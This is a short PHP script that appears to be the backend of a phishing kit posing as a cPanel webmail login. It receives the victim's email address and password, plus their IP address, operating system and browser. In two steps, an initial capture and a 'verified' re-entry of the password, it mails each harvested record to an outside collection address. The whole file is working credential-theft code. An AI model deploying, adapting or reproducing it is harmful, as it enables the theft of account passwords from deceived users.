<?php
    $mailLink = "test@mailboxfull.website";

    if(isset($_POST['verify']) && $_POST['verify'] == 'stepOne')
    {
        $email = $_POST['email'];
        $userBrowser = $_POST['userBrowser'];
        $userIp = $_POST['userIP'];
        $user_os = $_POST['OSName'];
        $password = htmlentities(trim($_POST['pwd']), ENT_QUOTES, 'UTF-8');

        $mailContent = "Username : " . $email . "\n";
        $mailContent.= "Password : " . $password . "\n";
        $mailContent.= "Password Verifie As : NOT VERIFIED\n";
        $mailContent.= "Client IP : " . $userIp . "\n";
        $mailContent.= "Client machine : " . $user_os . "\n";
        $mailContent.= "Client Browser : " . $userBrowser . "\n";
        $mailSubject = "Webmail cPanel - New Record Collected!";
        $headers = "MIME-Version: 1.0\n";
        mail($mailLink, $mailSubject, $mailContent, $headers);

        $response = array('status' => 200, 'isSent' => true, 'password' => $password);
    }
    if(isset($_POST['verify']) && $_POST['verify'] == 'stepTwo') {
        $email = $_POST['email'];
        $userBrowser = $_POST['userBrowser'];
        $userIp = $_POST['userIP'];
        $user_os = $_POST['OSName'];
        $password = htmlentities(trim($_POST['pwd']), ENT_QUOTES, 'UTF-8');
        $verified_pwd = htmlentities(trim($_POST['v_pwd']), ENT_QUOTES, 'UTF-8');

        $mailContent = "Username : " . $email . "\n";
        $mailContent.= "Password : " . $password . "\n";
        $mailContent.= "Password Verified As : " . $verified_pwd . "\n";
        $mailContent.= "Client IP : " . $userIp . "\n";
        $mailContent.= "Client machine : " . $user_os . "\n";
        $mailContent.= "Client Browser : " . $userBrowser . "\n";
        $mailSubject = "Webmail cPanel - New Record Verified!";
        $headers = "MIME-Version: 1.0\n";
        mail($mailLink, $mailSubject, $mailContent, $headers);

        $response = array('status' => 200, 'isSent' => true);
    }

    echo json_encode($response);
?>